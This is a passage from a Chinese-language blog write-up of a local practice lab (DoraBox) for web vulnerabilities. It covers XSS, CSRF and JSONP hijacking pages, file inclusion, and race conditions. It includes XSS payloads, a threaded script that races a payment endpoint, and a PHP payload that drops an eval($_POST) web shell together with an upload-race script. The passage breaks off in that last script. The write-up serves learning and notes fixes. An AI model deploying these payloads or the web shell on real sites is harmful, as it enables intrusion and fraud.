应用进行指纹识别，识别企业内部的资产信息</li>\n<li>攻击内外网的 web 应用，主要是使用 HTTP GET 请求就可以实现的攻击</li>\n</ol>\n</li>\n<li>一些的 url 中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"任意代码执行\"><a class=\"markdownIt-Anchor\" href=\"#任意代码执行\">#</a> 任意代码执行</h1>\n<p>根据题目提示，就是随便输代码，然后服务器执行脚本</p>\n<h2 id=\"过程-10\"><a class=\"markdownIt-Anchor\" href=\"#过程-10\">#</a> 过程：</h2>\n<ol>\n<li>phpinfo ()，查看 php 版本信息<img src=\"dorabox_code002.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-10\"><a class=\"markdownIt-Anchor\" href=\"#总结-10\">#</a> 总结：</h2>\n<p>代码执行漏洞就是通过执行脚本代码，进行渗透</p>\n<h1 id=\"任意命令执行\"><a class=\"markdownIt-Anchor\" href=\"#任意命令执行\">#</a> 任意命令执行</h1>\n<p>根据题目提示，就是随便输命令</p>\n<h2 id=\"过程-11\"><a class=\"markdownIt-Anchor\" href=\"#过程-11\">#</a> 过程：</h2>\n<ol>\n<li>whoami，查看服务器信息<img src=\"dorabox_cmd001.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-11\"><a class=\"markdownIt-Anchor\" href=\"#总结-11\">#</a> 总结：</h2>\n<p>看源码是利用 exec () 函数，直接调用操作系统的命令</p>\n<h1 id=\"反射xss\"><a class=\"markdownIt-Anchor\" href=\"#反射xss\">#</a> 反射 XSS</h1>\n<p>输入 12345678，查看源代码，发现服务器返回了输入的字符数统计，以及输入的字符串，在 html 中</p>\n<p><img src=\"dorabox_xss_ref001.png\" alt=\"\"></p>\n<h2 id=\"过程-12\"><a class=\"markdownIt-Anchor\" href=\"#过程-12\">#</a> 过程：</h2>\n<ol>\n<li>加入 js 代码，alert 一下<img src=\"dorabox_xss_ref002.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-12\"><a class=\"markdownIt-Anchor\" href=\"#总结-12\">#</a> 总结：</h2>\n<p>​\tXSS 反射型，就是通过 get 或者 post 请求，被后台处理过数据，并响应到前端页面上。可以通过使用白名单过滤掉输入的恶意字符进行修复。</p>\n<h1 id=\"存储型xss\"><a class=\"markdownIt-Anchor\" href=\"#存储型xss\">#</a> 存储型 XSS</h1>\n<p><img src=\"dorabox_xss_sav001.png\" alt=\"\"></p>\n<h2 id=\"过程-13\"><a class=\"markdownIt-Anchor\" href=\"#过程-13\">#</a> 过程：</h2>\n<ol>\n<li>alert 试一下</li>\n</ol>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert(<span class=\"string\">&quot;/XSS/&quot;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_xss_sav001.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li>submit 后返回了字符数，没有 alert，刷新一下，重新加载，发现存储成功</li>\n</ol>\n<p><img src=\"dorabox_xss_sav002.png\" alt=\"\"></p>\n<h2 id=\"总结-13\"><a class=\"markdownIt-Anchor\" href=\"#总结-13\">#</a> 总结：</h2>\n<p>存储型就是把用户输入的恶意字符串存储在服务器（数据库），一般在可以存储数据并会返回到前端代码的地方搞吧，别的用户点了，就会跳到小黑屋这种。或者利用一些平台脚本搞事情。</p>\n<p>漏洞修复：在服务端过滤掉 HTML 的尖括号，比如 php 的自带函数 strip_tags ()，然后对于一些可以执行的函数进行手动写函数过滤，过滤掉 onchange (),onload (),onclick (),onerror () 等等函数</p>\n<h1 id=\"dom型xss\"><a class=\"markdownIt-Anchor\" href=\"#dom型xss\">#</a> DOM 型 XSS</h1>\n<p><img src=\"dorabox_xss_sav001.png\" alt=\"\"></p>\n<h2 id=\"过程-14\"><a class=\"markdownIt-Anchor\" href=\"#过程-14\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>万能 alert，<script>alert(1)</script>：<img src=\"dorabox_xss_dom001.png\" alt=\"\"></p>\n<p>带有 xss 的 url：<a href=\"http://localhost/dorabox/xss/dom_xss.php?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;submit=submit\">http://localhost/dorabox/xss/dom_xss.php?name=&lt;script&gt;alert(1)&lt;%2Fscript&gt;&amp;submit=submit</a></p>\n</li>\n<li>\n<p>看源码是在这里打印的： <code>document.write(getURLValue('name'));</code></p>\n</li>\n</ol>\n<h2 id=\"总结-14\"><a class=\"markdownIt-Anchor\" href=\"#总结-14\">#</a> 总结：</h2>\n<p>DOM 型 xss，仅仅在前端页面进行操作的，通过修改页面的 DOM 节点形成的 XSS，效果和反射型类似。</p>\n<p>攻击者在 URL 中插入 XSS 代码，前端页面直接从 url 中获取 xss 代码并输出到页面，导致 xss 代码的执行，攻击者将带有 xss 代码的 url 发给用户，用户打开后收到攻击。</p>\n<h1 id=\"csrf跨域资源\"><a class=\"markdownIt-Anchor\" href=\"#csrf跨域资源\">#</a> CSRF 跨域资源</h1>\n<p><img src=\"dorabox_csrf_json001.png\" alt=\"\"></p>\n<h2 id=\"过程-15\"><a class=\"markdownIt-Anchor\" href=\"#过程-15\">#</a> 过程：</h2>\n<ol username:Vulkey_Chen,mobilephone:13188888888,email:admin@gh0st.cn,address:\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd,sex:CoolMan=\"\">\n<li>\n<p>构造 html 来劫持</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Ajax<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Ajax 发送 get 请求<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ajax</span>(<span class=\"params\"></span>) </span>&#123; </span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.responseType = <span class=\"string\">&quot;text&quot;</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.open(<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;http://localhost/dorabox/csrf/userinfo.php&#x27;</span>, <span class=\"literal\">true</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.onreadystatechange= <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>) </span>&#123; </span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">this</span>.status == <span class=\"number\">200</span>)&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\talert(<span class=\"built_in\">this</span>.responseText);</span></span><br><span class=\"line\"><span class=\"javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"javascript\"> &#125;;</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.send();</span></span><br><span class=\"line\"><span class=\"javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"javascript\">ajax();</span></span><br><span class=\"line\"><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_csrf_ky001.png\" alt=\"\">内容：</p>\n</li>\n</ol>\n<h2 id=\"总结-15\"><a class=\"markdownIt-Anchor\" href=\"#总结-15\">#</a> 总结：</h2>\n<pre><code>实话实说，这个就是借鉴网上的，解释一下js代码：\n\n自定义ajax()方法并执行，ajax内创建XMLHttpRequest对象，设置回应内容的类型为text。\n\n然后发送请求到服务器，其中 open(*method*,*url*,*async*)，第三个参数true为异步，异步 JavaScript 和 XML，XMLHttpRequest 对象如果要用于 AJAX 的话，其 open() 方法的 async 参数必须设置为 true。\n\nonreadystatechange：存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。readyState存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。\n</code></pre>\n<ul>\n<li>\n<p>0: 请求未初始化</p>\n</li>\n<li>\n<p>1: 服务器连接已建立</p>\n</li>\n<li>\n<p>2: 请求已接收</p>\n</li>\n<li>\n<p>3: 请求处理中</p>\n</li>\n<li>\n<p>4: 请求已完成，且响应已就绪</p>\n<p>status\t<br>\n200: “OK”，404: 未找到页面</p>\n</li>\n</ul>\n<p>最后响应成功就 alert 返回的数据</p>\n<p>function ajax() {<br>\nvar xhr = new XMLHttpRequest();<br>\nxhr.responseType = “text”;<br>\nxhr.open(‘GET’, ‘<a href=\"http://localhost/dorabox/csrf/userinfo.php\">http://localhost/dorabox/csrf/userinfo.php</a>’, true);<br>\nxhr.onreadystatechange= function(e) {<br>\nif(this.status == 200){<br>\nalert(this.responseText);<br>\n}<br>\n};<br>\nxhr.send();<br>\n}<br>\najax();</p>\n<h1 id=\"jsonp劫持\"><a class=\"markdownIt-Anchor\" href=\"#jsonp劫持\">#</a> JSONP 劫持</h1>\n<p><img src=\"dorabox_csrf_json001.png\" alt=\"\"></p>\n<h2 id=\"过程-16\"><a class=\"markdownIt-Anchor\" href=\"#过程-16\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>来一个 csrf 攻击代码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>JSONP劫持测试<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\">result</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"javascript\">        </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            alert(result.address);</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://localhost/dorabox/csrf/jsonp.php?callback=test&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_csrf_json002.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"总结-16\"><a class=\"markdownIt-Anchor\" href=\"#总结-16\">#</a> 总结：</h2>\n<p>JSONP (JSON With Padding)，是一种特殊的 CSRF 攻击，目的是获取敏感数据，当 JSON 数据响应给网站时，浏览器立即会调用数组或者对象的构造函数。正是利用这一点，把构造方法替换成恶意代码，在构造方法中添加将 JSON 数据发送给第三方即攻击者的代码。</p>\n<p>没写过，第一次写，写完跨域好像又多懂了一点点（好像真的懂了，但是入职培训里写的有点详细），我写完这些要再多写几道题，来一点画面感。</p>\n<h1 id=\"任意文件包含\"><a class=\"markdownIt-Anchor\" href=\"#任意文件包含\">#</a> 任意文件包含</h1>\n<p><img src=\"dorabox_filein002.png\" alt=\"\"></p>\n<h2 id=\"过程-17\"><a class=\"markdownIt-Anchor\" href=\"#过程-17\">#</a> 过程：</h2>\n<ol>\n<li>直接文件包含，输出<img src=\"dorabox_filein003.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-17\"><a class=\"markdownIt-Anchor\" href=\"#总结-17\">#</a> 总结：</h2>\n<p>网上看了很多通关记录，可是大家都是直接包含，如果不是本地靶场，那是怎么知道路径以及文件名的呢？是不是要配合文件上传一起？</p>\n<h1 id=\"任意文件包含-2\"><a class=\"markdownIt-Anchor\" href=\"#任意文件包含-2\">#</a> 任意文件包含</h1>\n<p><img src=\"dorabox_filein002.png\" alt=\"\"></p>\n<h2 id=\"过程-18\"><a class=\"markdownIt-Anchor\" href=\"#过程-18\">#</a> 过程：</h2>\n<ol>\n<li>输入 1，发现限制在当前目录，但是不影响要用的文件，所以也是直接包含就可以了<img src=\"dorabox_filein004.png\" alt=\"\"><img src=\"dorabox_filein003.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-18\"><a class=\"markdownIt-Anchor\" href=\"#总结-18\">#</a> 总结：</h2>\n<p>…/ 应该可以突破把</p>\n<h1 id=\"条件竞争-支付\"><a class=\"markdownIt-Anchor\" href=\"#条件竞争-支付\">#</a> 条件竞争 - 支付</h1>\n<p>靶场出了点问题，页面报 php 语法错</p>\n<p>但是语法并没有出错，百度了说是 php 版本的问题，但是我基本每个版本都试过且重启了，但是没有解决</p>\n<p>不过反正这个题要写脚本，我也不太会，干脆跟着把 poc 撸了一遍</p>\n<h2 id=\"过程-19\"><a class=\"markdownIt-Anchor\" href=\"#过程-19\">#</a> 过程：</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> queue</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    三个变量</span></span><br><span class=\"line\"><span class=\"string\">    url：要测试的网站地址</span></span><br><span class=\"line\"><span class=\"string\">    threads：线程数</span></span><br><span class=\"line\"><span class=\"string\">    q：调用queue构造方法，对列队大小不设限</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">url=<span class=\"string\">&quot;http://localhost/dorabox/race_condition/pay.php&quot;</span></span><br><span class=\"line\">threads=<span class=\"number\">25</span></span><br><span class=\"line\">q=queue.Queue()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在列队中加入50个元素,0-49</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">50</span>):</span><br><span class=\"line\">    q.put(i)   </span><br><span class=\"line\"><span class=\"comment\"># 定义post函数，发50个一块钱</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span>():</span> </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 当q里面还有元素时,就获取元素，发送一个post请求支付一块钱</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> q.empty():</span><br><span class=\"line\">        q.get() </span><br><span class=\"line\">        <span class=\"comment\"># Requests以form表单形式发送post请求，支付输入框name是money嘛</span></span><br><span class=\"line\">        <span class=\"comment\"># data = &#123;&#x27;key1&#x27;:&#x27;value1&#x27;,...&#125;</span></span><br><span class=\"line\">        r = requests.post(url, data = &#123;<span class=\"string\">&#x27;money&#x27;</span> : <span class=\"number\">1</span>&#125;)</span><br><span class=\"line\">        r.encoding = <span class=\"string\">&#x27;utf-8&#x27;</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(r.text)</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">一个python文件通常有两种使用方法,</span></span><br><span class=\"line\"><span class=\"string\"> 第一是作为脚本直接执行，</span></span><br><span class=\"line\"><span class=\"string\"> 第二是 import 到其他的 python 脚本中被调用（模块重用）执行。</span></span><br><span class=\"line\"><span class=\"string\"> 因此if __name__ == &#x27;main&#x27;: 的作用就是:</span></span><br><span class=\"line\"><span class=\"string\"> 控制这两种情况执行代码的过程，在if __name__ == &#x27;main&#x27;: 下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而 import 到其他脚本中是不会被执行的。</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\"> 每个python模块（python文件）都包含内置的变量 __name__，当该模块被直接执行的时候，__name__ 等于文件名（包含后缀 .py ）；如果该模块 import 到其他模块中，则该模块的 __name__ 等于模块名称（不包含后缀.py）</span></span><br><span class=\"line\"><span class=\"string\"> 而“__main__” 始终指当前执行模块的名称（包含后缀.py）。进而当模块被直接执行时，__name__ == &#x27;__main__&#x27; 结果为真。</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\"> 那其实就是主函数呗，程序运行入口，不过也有点区别嗷</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 用25个线程，分别发50个一块钱</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(threads)：</span><br><span class=\"line\">        t = threading.Thread(target=post) <span class=\"comment\"># 目标对象是post函数</span></span><br><span class=\"line\">        t.start() <span class=\"comment\"># 开始执行线程</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"总结-19\"><a class=\"markdownIt-Anchor\" href=\"#总结-19\">#</a> 总结：</h2>\n<p>python 代码写的时候，总是爱打分号唉<br>\n感觉大家写脚本或者一些小工具，都喜欢用 python，有点意思</p>\n<p>这里是看代码的时候找资料看见的（后来才发现 python 自带.chw api，不过英文的阅读起来也有点费时间就是了）：</p>\n<ul>\n<li>\n<p>Queue 是 python 标准库中的线程安全的列队 (FIFO) 实现<br>\n提供了一个适用于多线程编程的先进先出的数据结构，即列队<br>\n用来在生产者和消费者线程之间的信息传递</p>\n</li>\n<li>\n<p>class Queue.Queue(maxsize=0)<br>\n maxsize 是个整数，指明了列队中能存放的个数上限。<br>\n一旦达到上限，插入会导致阻塞，直到列队中的数据被消费掉。<br>\n如果 maxsize 小于或者等于 0，列队大小没有限制</p>\n</li>\n<li>\n<p>Queue,deque,queue 对比：queue 是多线程中的使用的栈，但是 Python 解释器有一个全局解释器锁 (PIL)，<br>\n导致每个 Python 进程中最多同时运行一个线程，<br>\n因此 Python 多线程程序并不能改善程序性能，不能发挥多核系统的优势。</p>\n</li>\n<li>\n<p>multiprocessing.Queue 是 Python 2.6 引入的用来实现多进程的一种高性能栈。</p>\n</li>\n<li>\n<p>collections.deque 是为了高效实现插入和删除操作的双向列表，适合用于队列和栈。</p>\n</li>\n<li>\n<p>queue 实例方法：<br>\nQueue.empty (): 判断队列是否为空。和上面一样注意<br>\n Queue.full (): 判断是否满了。和上面一样注意<br>\n Queue.put (item, block=True, timeout=None): 往队列里放数据。如果满了的话，blocking = False 直接报 Full 异常。如果 blocking = True，就是等一会，timeout 必须为 0 或正数。None 为一直等下去，0 为不等，正数 n 为等待 n 秒还不能存入，报 Full 异常。<br>\nQueue.put_nowait (item): 往队列里存放元素，不等待<br>\n Queue.get (item, block=True, timeout=None): 从队列里取数据。如果为空的话，blocking = False 直接报 empty 异常。如果 blocking = True，就是等一会，timeout 必须为 0 或正数。None 为一直等下去，0 为不等，正数 n 为等待 n 秒还不能读取，报 empty 异常<br>\n Queue.get_nowait (item): 从队列里取元素，不等待两个方法跟踪入队的任务是否被消费者 daemon 进程完全消费</p>\n</li>\n</ul>\n<h1 id=\"条件竞争-上传\"><a class=\"markdownIt-Anchor\" href=\"#条件竞争-上传\">#</a> 条件竞争 - 上传</h1>\n<p>看源码顺序：文件上传上来，检查后缀，后缀不在允许列表里，删除文件。</p>\n<p><img src=\"dorabox_jz_upload001.png\" alt=\"\"></p>\n<h2 id=\"过程-20\"><a class=\"markdownIt-Anchor\" href=\"#过程-20\">#</a> 过程：</h2>\n<p>竞争的地方，是先删除还是先执行，关键就在于赶在删除之前执行上传的文件。<br>\n这是我们上传的文件内容，新建一个 info.php 文件，里面写入一句话木马。</p>\n<figure class=\"highlight php\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> fputs(fopen(<span class=\"string\">&quot;info.php&quot;</span>, <span class=\"string\">&quot;w&quot;</span>), <span class=\"string\">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#x27;</span>); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>通过并发可以实现在上传成功未执行到删除代码的时候，访问执行，生成 info.php。</p>\n<p>脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 父类 threading.Thread</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RaceCondition</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_init_</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        threading.Thread._init_(self)</span><br><span class=\"line\">        self.url = <span class=\"string\">&#x27;http://localhost/dorabox/race_condition/key.php&#x27;</span> <span class=\"comment\"># 马</span></span><br><span class=\"line\">        self.uploadUrl = <span class=\"string\">&#x27;http://localhost/dorabox/race_condition/upload.php&#x27;</span>; <span class=\"comment\"># 搞它</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 获取上传的马，就是解析执行</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_get</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;try to call uploaded file...&#x27;</span>)</span><br><span class=\"line\">        r = requests.get(self.url)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> r.status_code == <span class=\"number\">200</span>: <span class=\"comment\"># 搞到成功就退出</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;create file info.php success.&#x27;</span>)</span><br><span class=\"line\">            os._exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 传马</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_upload</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;upload file...&#x27;</span>)</span><br><span class=\"line\">        file = &#123;<span class=\"string\">&#x27;myfile&#x27;</span> : <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;attack.php&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>)&#125; <span class=\"comment\">#key value的数据，我还以为是啥</span></span><br><span class=\"line\">        requests.post(self.uploadUrl, files=file)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 一直搞</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):  <span class=\"comment\"># 其实就外面那个循环不就好了，为啥还要再写一个for啊</span></span><br><span class=\"line\">                self._upload()</span><br><span class=\"line\">                self._get()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    threads = <span 